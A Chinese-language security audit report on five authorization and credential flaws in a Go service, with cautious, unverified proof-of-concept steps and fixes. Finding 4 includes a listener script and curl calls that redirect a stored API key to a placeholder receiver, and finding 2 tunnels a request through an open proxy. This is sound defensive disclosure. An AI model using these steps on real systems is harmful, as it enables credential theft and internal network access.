# 安全审计报告

## 审计范围与限制

- 审计版本：`070f798`。
- 范围：认证、授权、代理及凭据流；未覆盖全部代码。
- 以下发现均基于静态代码分析，**未经端到端复现**。复现命令和预期现象均待验证，不能视为实测结果；动态验证阶段因审查工具中止而未完成。
- 以下测试仅限有明确授权的隔离环境。使用测试账号、测试任务和测试密钥，不要将生产密钥发送给测试接收器。
- 置信度表示静态分析的判断，不代表漏洞已被实际利用。

| # | Severity | File | Lines | Vulnerability | Confidence |
|---|----------|------|-------|---------------|------------|
| 1 | 🟠 HIGH | `server/auth.go` | 141–175 | 删除账户后，未过期令牌可能绕过 RBAC | 10/10 |
| 2 | 🟠 HIGH | `cmd/antifox/main.go` | 62 | 默认代理对外监听且未认证，可能被用作开放代理 | 9/10 |
| 3 | 🟠 HIGH | `server/server_mgmt.go` | 634 | viewer 可能读取 MCP 配置中的明文凭据 | 10/10 |
| 4 | 🟠 HIGH | `server/knowledge.go` | 232 | operator 可能通过修改嵌入服务地址转发已有 API 密钥 | 9/10 |
| 5 | 🟠 HIGH | `server/server.go` | 893 | 任务列表可能未执行 RBAC 资源范围过滤 | 9/10 |

## 1. 删除账户后未过期令牌可能绕过 RBAC

**证据与影响**：`db/rbac.go:253` 在用户不存在时返回错误；`server/auth.go:143–175` 仅在成功解析用户授权画像时执行账户状态、令牌版本及权限检查。删除用户后，持有其未过期令牌的人员可能绕过权限检查。默认令牌有效期为 60 分钟。

**复核条件**：隔离实例、管理员账号以及仅具备只读权限的测试账号。先登录测试账号保存令牌，记录它访问 RBAC 管理接口时的拒绝响应；由管理员删除该账号后，在令牌过期前使用相同令牌再次请求该接口，比较响应和服务端日志。重点确认删除后的请求是否仍被身份验证或授权层拒绝。创建用户的请求体和实际响应尚未核实，不能将创建管理员账户视为已验证事实。

**修复建议**：对用户不存在、授权查询失败、主体为空或数据库故障均采取拒绝策略；删除账户时使已有令牌立即失效。增加删除、停用和查询失败的回归测试。

## 2. 默认代理可能被用作未认证的开放代理

**证据与影响**：`cmd/antifox/main.go:62` 默认监听 `:8788`；`server/manager.go:145–155` 启动代理，`traffic/traffic.go:120–142` 配置转发，`docker-compose.yml:30–32` 发布代理端口。能访问该端口的未认证用户可能借服务器访问其可达的内部 HTTP 服务。可利用范围取决于实际网络部署和服务可达性。

**待验证 PoC**：在代理可达的隔离环境中启动一个无敏感数据的测试 HTTP 服务，将下面的地址和端口替换为实际值。从可连接代理的另一客户端执行：

```sh
curl --noproxy '' -i \
  -x http://<代理地址>:8788 \
  http://<代理可达的测试服务地址>:<端口>/
```

检查测试服务日志中是否出现该请求，且代理是否未要求客户端认证。请求成功本身不证明该端口对公网开放；需结合部署配置和网络边界判断。

**修复建议**：默认仅监听回环地址，不在 Compose 中默认发布代理端口；确需远程访问时，增加认证、来源限制和网络隔离。

## 3. viewer 可能读取 MCP 配置中的明文凭据

**证据与影响**：默认 viewer 具有 `mcp:read`（`db/rbac.go:192–197`）。MCP 列表接口可能直接返回配置对象，其中 `env` 和 `headers` 可以包含令牌、API Key 或 `Authorization` 头（`server/server_mgmt.go:634`、`db/config.go:468–499`）。

**待验证 PoC**：

1. 在隔离环境中由管理员配置 MCP 服务，使用唯一的测试凭据，例如 `audit-only-token`。
2. 以 viewer 登录，获得该测试用户的令牌。
3. 请求 MCP 列表，检查响应中 `env` 或 `headers` 是否包含测试凭据原值：

```sh
curl -i \
  -H 'Authorization: Bearer <viewer令牌>' \
  http://127.0.0.1:8787/api/mcp
```

实际响应结构和接口行为尚未实测。测试后移除测试配置及令牌。

**修复建议**：使用独立响应 DTO，不返回凭据明文，只返回是否已配置等安全提示；更新配置时支持保留已有秘密。对实际已暴露的凭据进行轮换。

## 4. 修改嵌入服务地址可能转发已有 API 密钥

**证据与影响**：默认 operator 具有 `knowledge:write`。`db/knowledge.go:90–98` 在空 `api_key` 输入时保留旧密钥，`knowledge/embed.go:56–68` 向配置地址发送 Bearer 令牌。如果 operator 可改变目标地址并触发测试请求，可能将已有密钥发送到其控制的接收器。

**待验证 PoC**：

1. 在隔离实例中由管理员配置专用测试密钥，准备 operator 测试账号。
2. 在应用网络可达的隔离地址启动测试接收器。以下接收器仅比较测试值，不输出收到的密钥；不要在接收器中使用真实密钥。

```sh
EXPECTED_TEST_KEY='audit-only-token' python3 - <<'PY'
import os
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        self.rfile.read(length)
        expected = "Bearer " + os.environ["EXPECTED_TEST_KEY"]
        print("path:", self.path, "test key received:",
              self.headers.get("Authorization") == expected, flush=True)
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"data":[{"embedding":[1.0]}]}')

HTTPServer(("0.0.0.0", 19090), Handler).serve_forever()
PY
```

3. 使用 operator 令牌更新配置并触发测试。将 `<测试接收器地址>` 替换为应用所在网络可达的测试地址；容器内的 `127.0.0.1` 指向容器自身。

```sh
curl -i -X PUT http://127.0.0.1:8787/api/knowledge/config \
  -H 'Authorization: Bearer <operator令牌>' \
  -H 'Content-Type: application/json' \
  --data '{"enabled":true,"base_url":"http://<测试接收器地址>:19090","model":"test","api_key":"","dim":1}'

curl -i -X POST http://127.0.0.1:8787/api/knowledge/config/test \
  -H 'Authorization: Bearer <operator令牌>'
```

检查接收器是否输出 `test key received: True`。测试接口是否最终成功与密钥是否已发出是两个不同问题。接口、字段以及预期结果尚未动态核实。测试后恢复配置并停止接收器。

**修复建议**：将嵌入服务配置管理收归核心配置权限；修改目标地址时不得沿用旧密钥，并将凭据绑定到经管理员批准的目标。

## 5. 任务列表可能未执行资源范围过滤

**证据与影响**：`db/rbac.go:162–165` 定义默认资源范围，`server/rbac_enforce.go:76–78` 检查模块权限。任务列表处理器 `server/server.go:893` 可能未根据当前用户的资源范围过滤任务；任务 DTO 在 `server/dto.go:31–36` 包含描述和目标。受限用户可能看到其他任务的信息。

**待验证 PoC**：

1. 在隔离环境创建两个应相互隔离的测试任务，并确认测试 viewer 的实际任务分配范围。
2. 以该 viewer 的令牌请求任务列表：

```sh
curl -i \
  -H 'Authorization: Bearer <viewer令牌>' \
  http://127.0.0.1:8787/api/tasks
```

对照该用户实际分配的任务，检查响应是否包含其无权查看的任务。其他按 ID 的接口需要分别验证，不能仅凭列表结果推断。

**修复建议**：建立可验证的资源归属或分配关系，在列表和按 ID 的读写操作中统一强制 `all`、`assigned`、`own` 范围，增加跨用户隔离测试。
